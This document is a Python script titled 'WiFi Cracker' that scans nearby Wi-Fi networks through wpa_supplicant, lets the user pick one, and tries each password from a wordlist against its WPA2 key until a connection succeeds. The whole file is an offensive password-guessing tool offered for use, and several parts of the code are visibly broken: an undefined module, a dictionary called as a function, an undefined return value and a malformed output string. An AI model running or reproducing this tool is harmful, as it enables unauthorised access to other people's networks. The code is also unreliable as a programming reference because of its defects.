#!/usr/bin/env python3

from time import sleep
import socket
import stat
import os

if os.name != 'posix':
  raise NotImplementedError("This cracker isn't supported on this os.")

# Define interface status.
IFACE_DISCONNECTED = 0
IFACE_SCANNING = 1
IFACE_INACTIVE = 2
IFACE_CONNECTING = 3
IFACE_CONNECTED = 4

# Define auth algorithms.
AUTH_ALG_OPEN = 0
AUTH_ALG_SHARED = 1

# Define auth key mgmt types.
AKM_TYPE_NONE = 0
AKM_TYPE_WPA = 1
AKM_TYPE_WPAPSK = 2
AKM_TYPE_WPA2 = 3
AKM_TYPE_WPA2PSK = 4
AKM_TYPE_UNKNOWN = 5

# Define ciphers.
CIPHER_TYPE_NONE = 0
CIPHER_TYPE_WEP = 1
CIPHER_TYPE_TKIP = 2
CIPHER_TYPE_CCMP = 3
CIPHER_TYPE_UNKNOWN = 4

KEY_TYPE_NETWORKKEY = 0
KEY_TYPE_PASSPHRASE = 1

CTRL_IFACE_DIR = '/var/run/wpa_supplicant'
CTRL_IFACE_RETRY = 3
REPLY_SIZE = 4096

status_dict = {
    'completed': IFACE_CONNECTED,
    'inactive': IFACE_INACTIVE,
    'authenticating': IFACE_CONNECTING,
    'associating': IFACE_CONNECTING,
    'associated': IFACE_CONNECTING,
    '4way_handshake': IFACE_CONNECTING,
    'group_handshake': IFACE_CONNECTING,
    'interface_disabled': IFACE_INACTIVE,
    'disconnected': IFACE_DISCONNECTED,
    'scanning': IFACE_SCANNING
}

key_mgmt_to_str = {
    AKM_TYPE_WPA:     'WPA-EAP',
    AKM_TYPE_WPAPSK:  'WPA-PSK',
    AKM_TYPE_WPA2:    'WPA-EAP',
    AKM_TYPE_WPA2PSK: 'WPA-PSK'
}

key_mgmt_to_proto_str = {
    AKM_TYPE_WPA:     'WPA',
    AKM_TYPE_WPAPSK:  'WPA',
    AKM_TYPE_WPA2:    'RSN',
    AKM_TYPE_WPA2PSK: 'RSN'
}

proto_to_key_mgmt_id = {
    'WPA': AKM_TYPE_WPAPSK,
    'RSN': AKM_TYPE_WPA2PSK
}

cipher_str_to_value = {
    'TKIP': CIPHER_TYPE_TKIP,
    'CCMP': CIPHER_TYPE_CCMP,
}

def clear(message:str = None):
    os.system('clear')
    if message != None: print(message)

set_title = lambda title : print(f'\33]0;{title}\a', end='', flush=True)

class WifiUtil():
    """WifiUtil implements the wifi functions in Linux."""

    _connections = {}

    def scan(self, obj):
        """Trigger the wifi interface to scan."""

        self._send_cmd_to_wpas(obj['name'], 'SCAN')

    def scan_results(self, obj):
        """Get the AP list after scanning."""

        bsses = []
        bsses_summary = self._send_cmd_to_wpas(obj['name'], 'SCAN_RESULTS', True)
        bsses_summary = bsses_summary[:-1].split('\n')
        if len(bsses_summary) == 1:
            return bsses

        for l in bsses_summary[1:]:
            values = l.split('\t')
            bss = Profile()
            bss.bssid = values[0]
            bss.freq = int(values[1])
            bss.signal = int(values[2])
            bss.ssid = values[4]
            bss.akm = []
            if 'WPA-PSK' in values[3]:
                bss.akm.append(AKM_TYPE_WPAPSK)
            if 'WPA2-PSK' in values[3]:
                bss.akm.append(AKM_TYPE_WPA2PSK)
            if 'WPA-EAP' in values[3]:
                bss.akm.append(AKM_TYPE_WPA)
            if 'WPA2-EAP' in values[3]:
                bss.akm.append(AKM_TYPE_WPA2)

            bss.auth = AUTH_ALG_OPEN

            bsses.append(bss)

        return bsses

    def connect(self, obj, network):
        """Connect to the specified AP."""

        network_summary = self._send_cmd_to_wpas(
            obj['name'],
            'LIST_NETWORKS',
            True)
        network_summary = network_summary[:-1].split('\n')
        if len(network_summary) == 1:
            return networks

        for l in network_summary[1:]:
            values = l.split('\t')
            if values[1] == network.ssid:
                network_summary = self._send_cmd_to_wpas(
                    obj['name'],
                    'SELECT_NETWORK {}'.format(values[0]),
                    True)

    def disconnect(self, obj):
        """Disconnect to the specified AP."""

        self._send_cmd_to_wpas(obj['name'], 'DISCONNECT')

    def add_network_profile(self, obj, params):
        """Add an AP profile for connecting to afterward."""

        network_id = self._send_cmd_to_wpas(obj['name'], 'ADD_NETWORK', True)
        network_id = network_id.strip()

        params.process_akm()

        self._send_cmd_to_wpas(
                obj['name'],
                'SET_NETWORK {} ssid \"{}\"'.format(network_id, params.ssid))

        key_mgmt = ''
        if params.akm[-1] in [AKM_TYPE_WPAPSK, AKM_TYPE_WPA2PSK]:
            key_mgmt = 'WPA-PSK'
        elif params.akm[-1] in [AKM_TYPE_WPA, AKM_TYPE_WPA2]:
            key_mgmt = 'WPA-EAP'
        else:
            key_mgmt = 'NONE'

        if key_mgmt:
            self._send_cmd_to_wpas(
                    obj['name'],
                    'SET_NETWORK {} key_mgmt {}'.format(
                        network_id,
                        key_mgmt))

        proto = ''
        if params.akm[-1] in [AKM_TYPE_WPAPSK, AKM_TYPE_WPA]:
            proto = 'WPA'
        elif params.akm[-1] in [AKM_TYPE_WPA2PSK, AKM_TYPE_WPA2]:
            proto = 'RSN'

        if proto:
            self._send_cmd_to_wpas(
                    obj['name'],
                    'SET_NETWORK {} proto {}'.format(
                        network_id,
                        proto))

        if params.akm[-1] in [AKM_TYPE_WPAPSK, AKM_TYPE_WPA2PSK]:
            self._send_cmd_to_wpas(
                    obj['name'],
                    'SET_NETWORK {} psk \"{}\"'.format(network_id, params.key))

        return params

    def network_profiles(self, obj):
        """Get AP profiles."""

        networks = []
        network_ids = []
        network_summary = self._send_cmd_to_wpas(
            obj['name'],
            'LIST_NETWORKS',
            True)
        network_summary = network_summary[:-1].split('\n')
        if len(network_summary) == 1:
            return networks

        for l in network_summary[1:]:
            network_ids.append(l.split()[0])

        for network_id in network_ids:
            network = Profile()

            network.id = network_id

            ssid = self._send_cmd_to_wpas(
                obj['name'],
                'GET_NETWORK {} ssid'.format(network_id), True)
            if ssid.upper().startswith('FAIL'):
                continue
            else:
                network.ssid = ssid[1:-1]

            key_mgmt = self._send_cmd_to_wpas(
                obj['name'],
                'GET_NETWORK {} key_mgmt'.format(network_id),
                True)

            network.akm = []
            if key_mgmt.upper().startswith('FAIL'):
                continue
            else:
                if key_mgmt.upper() in ['WPA-PSK']:
                    proto = self._send_cmd_to_wpas(
                        obj['name'],
                        'GET_NETWORK {} proto'.format(network_id),
                        True)

                    if proto.upper() == 'RSN':
                        network.akm.append(AKM_TYPE_WPA2PSK)
                    else:
                        network.akm.append(AKM_TYPE_WPAPSK)
                elif key_mgmt.upper() in ['WPA-EAP']:
                    proto = self._send_cmd_to_wpas(
                        obj['name'],
                        'GET_NETWORK {} proto'.format(network_id),
                        True)

                    if proto.upper() == 'RSN':
                        network.akm.append(AKM_TYPE_WPA2)
                    else:
                        network.akm.append(AKM_TYPE_WPA)

            ciphers = self._send_cmd_to_wpas(
                obj['name'],
                'GET_NETWORK {} pairwise'.format(network_id),
                True).split(' ')

            if ciphers[0].upper().startswith('FAIL'):
                continue
            else:
                # Assume the possible ciphers TKIP and CCMP
                if len(ciphers) == 1:
                    network.cipher = cipher_str_to_value(ciphers[0].upper())
                elif 'CCMP' in ciphers:
                    network.cipher = CIPHER_TYPE_CCMP

            networks.append(network)

        return networks

    def remove_network_profile(self, obj, params):
        """Remove the specified AP profiles"""

        network_id = -1
        profiles = self.network_profiles(obj)

        for profile in profiles:
            if profile == params:
                network_id = profile.id

        if network_id != -1:
            self._send_cmd_to_wpas(obj['name'],
                'REMOVE_NETWORK {}'.format(network_id))

    def remove_all_network_profiles(self, obj):
        """Remove all the AP profiles."""

        self._send_cmd_to_wpas(obj['name'], 'REMOVE_NETWORK all')

    def status(self, obj):
        """Get the wifi interface status."""

        reply = self._send_cmd_to_wpas(obj['name'], 'STATUS', True)
        result = reply.split('\n')

        status = ''
        for l in result:
            if l.startswith('wpa_state='):
                status = l[10:]
                return status_dict[status.lower()]

    def interfaces(self):
        """Get the wifi interface lists."""
        
        ifaces = []
        for f in sorted(os.listdir(CTRL_IFACE_DIR)):
            sock_file = '/'.join([CTRL_IFACE_DIR, f])
            mode = os.stat(sock_file).st_mode
            if stat.S_ISSOCK(mode):
                iface = {}
                iface['name'] = f
                ifaces.append(iface)
                self._connect_to_wpa_s(f)

        return ifaces

    def _connect_to_wpa_s(self, iface):

        ctrl_iface = '/'.join([CTRL_IFACE_DIR, iface])
        if ctrl_iface in self._connections:
            f"Connection for iface '{iface}' aleady existed!"

        sock_file = '{}/{}_{}'.format('/tmp', 'pywifi', iface)
        self._remove_existed_sock(sock_file)
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        sock.bind(sock_file)
        sock.connect(ctrl_iface)

        send_len = sock.send(b'PING')
        retry = CTRL_IFACE_RETRY
        while retry >= 0:
            reply = sock.recv(REPLY_SIZE)
            if reply == b'':
                f"Connection to '{iface_ctrl}' is broken!"
                break

            if reply.startswith(b'PONG'):
                f"Connect to sock '{ctrl_iface}' successfully!"
                self._connections[iface] = {
                    'sock': sock,
                    'sock_file': sock_file,
                    'ctrl_iface': ctrl_iface
                }
                break
            retry -= 1

    def _remove_existed_sock(self, sock_file):

        if os.path.exists(sock_file):
            mode = os.stat(sock_file).st_mode
            if stat.S_ISSOCK(mode):
                os.remove(sock_file)

    def _send_cmd_to_wpas(self, iface, cmd, get_reply=False):

        if 'psk' not in cmd:
            f"Send cmd '{cmd}' to wpa_s"
        sock = self._connections[iface]['sock']

        sock.send(bytearray(cmd, 'utf-8'))
        reply = sock.recv(REPLY_SIZE)
        if get_reply:
            return reply.decode('utf-8')

        if reply != b'OK\n':
            f"Unexpected resp '{reply.decode('utf-8')}' for Command '{cmd}'"


class WiFi:
    """This class provides operations to manipulate wifi devices."""

    def interfaces(self):
        """Collect the available wlan interfaces."""

        self._ifaces = []
        wifi_ctrl = wifiutil.WifiUtil()

        for interface in wifi_ctrl.interfaces():
            iface = Interface(interface)
            self._ifaces.append(iface)

        if not self._ifaces:
            "Can't get wifi interface"

        return self._ifaces

class Profile():
    
    def __init__(self):

        self.id = 0
        self.auth = AUTH_ALG_OPEN
        self.akm = [AKM_TYPE_NONE]
        self.cipher = CIPHER_TYPE_NONE
        self.ssid = None
        self.bssid = None
        self.key = None

    def process_akm(self):

        if len(self.akm) > 1:
            self.akm = self.akm[-1:]

    def __eq__(self, profile):

        if profile.ssid:
            if profile.ssid != self.ssid:
                return False

        if profile.bssid:
            if profile.bssid != self.bssid:
                return False

        if profile.auth:
            if profile.auth!= self.auth:
                return False

        if profile.cipher:
            if profile.cipher != self.cipher:
                return False

        if profile.akm:
            if set(profile.akm).isdisjoint(set(self.akm)):
                return False

        return True

class Interface:
    """Interface provides methods for manipulating wifi devices."""

    """
    For encapsulating OS dependent behavior, we declare _raw_obj here for
    storing some common attribute (e.g. name) and os attributes (e.g. dbus
    objects for linux)
    """
    _raw_obj = {}
    _wifi_ctrl = {}

    def __init__(self, raw_obj):

        self._raw_obj = raw_obj
        self._wifi_ctrl = wifiutil.WifiUtil()

    def name(self):
        """"Get the name of the wifi interfacce."""

        return self._raw_obj['name']

    def scan(self):
        """Trigger the wifi interface to scan."""

        self._wifi_ctrl.scan(self._raw_obj)

    def scan_results(self):
        """Return the scan result."""
        
        return self._wifi_ctrl.scan_results(self._raw_obj)

    def add_network_profile(self, params):
        """Add the info of the AP for connecting afterward."""

        return self._wifi_ctrl.add_network_profile(self._raw_obj, params)

    def remove_network_profile(self, params):
        """Remove the specified AP settings."""

        self._wifi_ctrl.remove_network_profile(self._raw_obj, params)

    def remove_all_network_profiles(self):
        """Remove all the AP settings."""

        self._wifi_ctrl.remove_all_network_profiles(self._raw_obj)

    def network_profiles(self):
        """Get all the AP profiles."""

        return self._wifi_ctrl.network_profiles(self._raw_obj)

    def connect(self, params):
        """Connect to the specified AP."""

        self._wifi_ctrl.connect(self._raw_obj, params)

    def disconnect(self):
        """Disconnect from the specified AP."""

        self._wifi_ctrl.disconnect(self._raw_obj)

    def status(self):
        """Get the status of the wifi interface."""

        return self._wifi_ctrl.status(self._raw_obj)

class main():
    
    status = True
  
    def __init__(self):
        
        set_title("WiFi Cracker")

        try:
            self.wifi = WiFi()
            self.interface = self.wifi.interfaces()[0]  # Select First Wireless Interface Card
            self.banner()
        except FileNotFoundError: exit("Turn on WiFi!")

        otk = ' ' * (self.tw // 4 - 7)
        if len(otk) >= 15: otk = otk[0:-11]

        print(f"\r{otk[0:len(otk)//2]}[*] Scanning ... ", end='', flush=True)
        self.APs = self.scan()
        print(f"\r{otk[0:len(otk)//2]}[*] Scanned"+' '*6, end='', flush=True)

        print(f"\r{otk[0:len(otk)//2]}[*] choose of the SSIDs below :", end='\n', flush=True)

        for i in range(len(self.APs)):
            print(f"\n{otk}[{i+1}] {self.APs[i].ssid}")
            sleep(.06)
        
        print(f"\n{otk[0:(len(otk)//2)]}[*] press enter to refresh \n")
    
        while True:
            try:
                inp = self.input('ssid')
                if inp == '': self.__init__()
                else:
                    index = int(inp)
                    target = self.APs[index - 1]

                    print(f"\n  @SSID : {target.ssid}\n")

                    passlist , stat = self.Getpwl() # PassWord List

                    if stat :
                        try:
                            for password in passlist.readlines() :
                                password = password.strip("\n")
                                if len(password) < 8 or len(password) > 64:
                                    print(f"\n   [!] password structure is incorrect! : {password}")
                                    continue
                                
                                print("\n  [*] Testing : {}".format(password))
                                
                                if self.TcWifi(target.ssid , password) : # Test for connection using password
                                    print("\n{self.dwb  [#] PASSWORD found : %s \n%s" % (password, self.dwb))
                                    self.status = False
                                    break

                            if self.status: print(f"\n   [!] password was not found in password-list!\n")
                        except: ...
                    else:
                        print(f"\n   [!] Could not open file! \n")

            except IndexError:
                print(f"\n   [!] SSID name is incorrect! or lost ...\n")
                continue

            except ValueError:
                print(f"\n   [!] input is incorrect!\n")
                continue
            
            except EOFError:
                print()
                continue

    def banner(self):
        self.tw = os.get_terminal_size()[0]
        self.dwb = ('-' * (self.tw - 2)).center(self.tw, ' ')+'\n'
        qwb = (' ' * (self.tw - 18)) + '(Ctrl+C to quit)'
        clear(self.dwb + ' WiFi Cracker '.center(self.tw,' ') + '\n' + self.dwb + qwb)

    def input(self, dir, iw=1): return input(f"{' '*iw+'@WFC:'f'~/{dir}'} $ ").strip()

    def Getpwl(self):
        data = self.input(f'pwl (_file) ', 2)
        try:return(open(data), True)
        except:return(None, False)


    def scan(self):
        "For Scan the area"
        try:
            self.interface.scan()
            return self.interface.scan_results()
        except: ...
  
    def TcWifi(self, ssid , password):
        self.interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = AUTH_ALG_OPEN
        profile.akm.append(AKM_TYPE_WPA2PSK) # AM_TYPE_WPA2PSK
        profile.cipher = CIPHER_TYPE_CCMP
        profile.key = password
        self.interface.connect(self.interface.add_network_profile(profile))
        if self.interface.status() == IFACE_CONNECTED:
            self.interface.remove_network_profile(profile)
            return True
        else:
            self.interface.remove_network_profile(profile)
            return False

if __name__ == '__main__':
    try: main() if os.geteuid() == 0 else quit('sudo python3 cracker.py')
    except KeyboardInterrupt: clear()
